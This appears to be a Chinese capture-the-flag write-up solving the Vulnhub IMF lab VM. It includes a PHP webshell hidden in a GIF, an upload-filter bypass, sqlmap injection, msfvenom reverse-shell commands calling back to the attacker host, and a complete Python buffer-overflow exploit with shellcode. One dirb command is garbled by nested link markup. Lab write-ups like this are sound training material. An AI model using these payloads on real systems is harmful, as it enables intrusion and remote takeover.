***本文原创作者：saltafiso，本文属FreeBuf原创奖励计划，未经许可禁止转载。**  

**![微信图片_20180718110720.png](https://image.3001.net/images/20180718/15318833346867.png!small)**

## Vulnhub简介  

 **Vulnhub
是一个面向公众开放的靶机平台，主旨是让任何人获得信息安全相关的的实战经验。里面有很多设计好的练习靶机镜像，每个镜像都有多个flag。网址<https://www.vulnhub.com/>**

### 下载链接

<https://download.vulnhub.com/imf/IMF.ova>

## 靶机说明

IMF 是一个初级难度的boot 2 root 靶机。
flag难度从简单到困难，并且每个flag都含有关于获取下一个flag的提示。作者邮箱geckom@redteamr.com。

## 目标

Boot2Root：查看flag， 获得root权限。

## 运行环境

Kali on WSL，

Windows10

主机IP：192.168.190.1

## 信息收集

启动IMF虚拟机，使用nmap扫描网段端口，发现主机IP 命令：

    
    
    nmap -sn 192.168.190.1/24
    
    
    
    ⋊> ~ nmap -sn 192.168.190.1/24                                       
    
    Nmap scan report for 192.168.190.128
    
    Host is up (0.00s latency).
    
    MAC Address: 00:0C:29:6C:59:6B (VMware)
    
    Nmap scan report for 192.168.190.254
    
    Host is up (0.00s latency).
    
    MAC Address: 00:50:56:E8:51:DE (VMware)
    
    Nmap scan report for 192.168.190.1
    
    Host is up.
    
    Nmap done: 256 IP addresses (3 hosts up) scanned in 28.20 seconds
    

发现主机IP之后再做深度扫描（-A参数）命令：

    
    
    nmap -A 192.168.190.128
    
    
    
    ⋊> ~ nmap -A 192.168.190.128                                         
    
    Nmap scan report for 192.168.190.128
    
    Host is up (0.00046s latency).
    
    Not shown: 999 filtered ports
    
    PORT   STATE SERVICE VERSION
    
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    
    |_http-title: IMF - Homepage
    
    MAC Address: 00:0C:29:6C:59:6B (VMware)
    
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    
    Device type: general purpose
    
    Running: Linux 3.X|4.X
    
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    
    OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
    
    Network Distance: 1 hop
    
    TRACEROUTE
    
    HOP RTT     ADDRESS
    
    1   0.46 ms 192.168.190.128
    
    OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
    
    Nmap done: 1 IP address (1 host up) scanned in 33.81 seconds
    

发现只有80端口开着，直接访问网页。

## flag1

查看网页源码，在contact.php的源码里发现flag1：

![0.png](https://image.3001.net/images/20180710/15312076774692.png!small)

base64解码后得到提示: `allthefiles`

## flag2

根据提示，注意到contact.php里Js文件的名字是：![1.png](https://image.3001.net/images/20180710/15312076969840.png!small)base64编码

将三个文件名按顺序排列再base64解码后发现flag2，

    
    
    echo 'ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==' |base64 -d  
    
    flag2{aW1mYWRtaW5pc3RyYXRvcg==}
    

再次bas64解码后得到提示：`imfadministrator`

## flag3

### 0x01

访问`192.168.190.128/imfadministrator`后进入到登陆界面:

![2.png](https://image.3001.net/images/20180710/15312077178424.png!small)

输入任意用户名显示 Invalid username，所以回到contact.php，复制联系人邮箱的前半部分，这里我用的是rmichaels，
之后就只是提示Invalid password了。

![3.png](https://image.3001.net/images/20180710/1531207763932.png!small)

### 0x02

查看源码发现注释：

![4.png](https://image.3001.net/images/20180710/15312077925209.png!small)

通过注释得知密码是直接写在php文件里的。

猜测是使用strcmp之类的来判断密码的。当strcmp的两个字符串参数相等的时候会返回0，但如果把string和array相比较的话，strcmp也会返回0。

所以将源码里的`<input name="pass" value="" type="password">`

修改成`<input name="pass[]" value="" type="password">`使pass参数变成array。

提交后发现flag3，base64解码后得到提示：`continueTOcms`

## flag4

进入cms后浏览网页，发现URL里面pagename参数存在注入点，复制cookie信息然后使用sqlmap测试：

    
    
    ⋊> ~  sqlmap -u "[http://192.168.190.128/imfadministrator/cms.php?pagename=upload](http://192.168.190.128/imfadministrator/cms.php?pagename=upload)" --cookie "PHPSESSID=9q75n4adk0os5lultm4a5934t2" --dump
    

dump之后发现有一项`tutorials-incomplete`没被访问过，访问后发现一张带有二维码的图片，扫码获得flag4，解码后得到提示：`uploadr942.php`

## flag5

根据提示，访问192.168.190.128/imfadministrator/uploadr942.php，进入到一个文件上传页面。

![5.png](https://image.3001.net/images/20180710/15312078654992.png!small)

经过反复尝试发现只能提交图片类（jpg，png，gif）文件，并且有WAF和文件头过滤，传不了php shell，于是在php文件里写入：

    
    
    <?php $s=$_GET['s']; echo `$s`; ?>
    

再使用windows命令：

    
    
    copy /b 文件1+文件2 文件3
    

将php文件和图像文件合并。 上传后查看网页源码会发现一行注释：

![6.png](https://image.3001.net/images/20180710/15312078856275.png!small)

注释就是重命名后的图片，但是图片不在imfadministrator目录下。接下来需要找到上传文件的位置，我猜测是在imfadministrator目录下的某个文件夹里，运行dirb爆破目录：

`dirb
"[[[[[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)))]([[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))))]([[[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)))]([[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)))))]([[[[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)))]([[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))))]([[[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)))]([[[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))]([[<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>)]([<http://192.168.190.128/imfadministrator/>](<http://192.168.190.128/imfadministrator/>))))))"`

发现有一个uploads的文件夹，经过多次尝试发现只有gif文件可以执行PHP代码，访问192.168.190.128/imfadministrator/uploads/fc138a7b7253.gif?s=ls
后发现文件flag5_abc123def.txt， 将s参数设置为 `cat flag5_abc123def.txt` 后得到flag5， 解码后得到提示
`agentservices`

## flag6

### 0x00

为了方便操作，我先上传了个php reverse shell：

    
    
    msfvenom -p php/reverse_php LHOST=192.168.190.1 LPORT=4444 -e php/base64 -f raw > shell.php
    

然后将s参数设置为`echo ‘<shell文件内容>’ >shell.php`进行上传。

之后再上传一个php/meterpreter_reverse：

    
    
    msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.190.1 LPORT=4444 -e php/base64 -f raw > msf.php
    

然后在主机上使用命令：

    
    
    nc -l 6666 < msf.php
    

在php shell内使用命令：

    
    
    nc -nv 192.168.128.1 6666 > msf.php
    

之后使用msfconsole连接meterpreter shell：

    
    
    use /exploit/multi/handler
    
    set payload php/meterpreter_reverse_tcp
    
    set LHOST=192.168.190.1
    
    run
    

### 0x01

连接之后根据提示查找叫agent的服务。

Shell中输入 `whereis agent` 得到结果：`agent: /usr/local/bin/agent`

进入/usr/local/bin/ 目录发现还有一个叫access_codes的文件，打开后显示：

`SYN 7482,8279,9467`

看起来像是运行了knock。先按顺序扫描这三个端口：

    
    
    nmap -p7482,8279,9467 -r 192.168.190.128
    

再重新扫描一遍靶机：

`nmap -p1-65535 192.168.190.128`

    
    
    Nmap scan report for 192.168.190.128
    
    Host is up (0.00022s latency).
    
    Not shown: 65533 filtered ports
    
    PORT     STATE SERVICE
    
    80/tcp   open  http
    
    7788/tcp open  unknown
    
    MAC Address: 00:0C:29:6C:59:6B (VMware)
    
    Nmap done: 1 IP address (1 host up) scanned in 109.28 seconds
    

发现新开了7788端口，连接端口发现是运行着agent程序。

### 0x02

Shell中输入agent运行程序：

![7.png](https://image.3001.net/images/20180710/15312079146918.png!small)

随便输入Agent ID会让程序退出，运行`ltrace agent`

![8.png](https://image.3001.net/images/20180710/15312079608382.png!small)

发现Agent ID是'''48093572'''，输入正确ID后出现选项：

![9.png](https://image.3001.net/images/20180710/15312080607409.png!small)

其中选项2和3可以让用户输入内容，

如此看来是要通过缓冲区溢出7788端口的agent程序。

### 0x03

下载程序到主机，然后使用edb对程序进行测试：

`edb --run agent`

运行程序后先选择3.submit report进行测试：

运行`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l
1024`来获取1024个测试字符，然后输入字符：

![A.png](https://image.3001.net/images/20180710/1531208091689.png!small)

再用`/usr/share/metasploit-­‐framework/tools/pattern_offset.rb -q 41366641`反查：

    
    
    [*] Exact match at offset 168
    

发现程序在第168个字符处溢出，再生成A168+B4+C*1000的测试字符：

![B.png](https://image.3001.net/images/20180710/15312081152906.png!small)

发现EAX变成了一堆A，看能不能找到 '''call eax'''。

`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 22:37:10nasm >
call eax 00000000 FFD0 call eax`

edb里搜索FFD0，找到地址 `0x08048563`

![C.png](https://image.3001.net/images/20180710/15312081667844.png!small)

重启程序发现地址不变，就选这个地址来作为EIP的值。

###  **0x04**

生成shell：

    
    
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.190.1 LPORT=6666 -f python -b "\x00\x0a\x0d" > ATK.py       [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload                                    [-] No arch selected, selecting arch: x86 from the payload                                                              Found 10 compatible encoders                                                                                            Attempting to encode payload with 1 iterations of x86/shikata_ga_nai                                                    x86/shikata_ga_nai succeeded with size 95 (iteration=0)                                                                 x86/shikata_ga_nai chosen with final size 95                                                                            Payload size: 95 bytes                                                                                                  Final size of python file: 470 bytes
    

编写exp：

    
    
    import socket
    
    import time
    
    host = "192.168.190.128"
    
    port = 7788
    
    ret = "\x63\x85\x04\x08\n"
    
    buf =  ""
    
    buf += "\xbb\xa3\xdc\x2d\x95\xdb\xc2\xd9\x74\x24\xf4\x5f\x33"
    
    buf += "\xc9\xb1\x12\x31\x5f\x12\x03\x5f\x12\x83\x64\xd8\xcf"
    
    buf += "\x60\x5b\x3a\xf8\x68\xc8\xff\x54\x05\xec\x76\xbb\x69"
    
    buf += "\x96\x45\xbc\x19\x0f\xe6\x82\xd0\x2f\x4f\x84\x13\x47"
    
    buf += "\x90\xde\x5a\x96\x78\x1d\xa3\x82\x72\xa8\x42\x02\xe4"
    
    buf += "\xfa\xd5\x31\x5a\xf9\x5c\x54\x51\x7e\x0c\xfe\x04\x50"
    
    buf += "\xc2\x96\xb0\x81\x0b\x04\x28\x57\xb0\x9a\xf9\xee\xd6"
    
    buf += "\xaa\xf5\x3d\x98"
    
    buf += "A" * (168 - len(buf))
    
    buf += ret
    
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    con.connect((host, port))
    
    print "Connected"
    
    print con.recv(1024)
    
    con.send(b"48093572\n")
    
    print con.recv(1024)
    
    con.send(b"3\n")
    
    print con.recv(1024)
    
    print "Sending evil buffer..."
    
    con.send(buf)
    
    print "done"
    

打开nc监听6666端口,然后就得到了root权限。

进入/root目录，得到TheEnd.txt和最后一个flag，解码得到Gh0stProt0c0ls。

![D.png](https://image.3001.net/images/20180710/15312082094016.png!small)

## 总结

总体来说每一个flag都很清晰得提示了获得下一个flag的方法。

 **主要突破点：**

从网页源码里的文件名找到flag；

将表单里pass转成array；

绕过WAF上传文件；

knock 服务器端口。  

***本文原创作者：saltafiso，本文属FreeBuf原创奖励计划，未经许可禁止转载。**

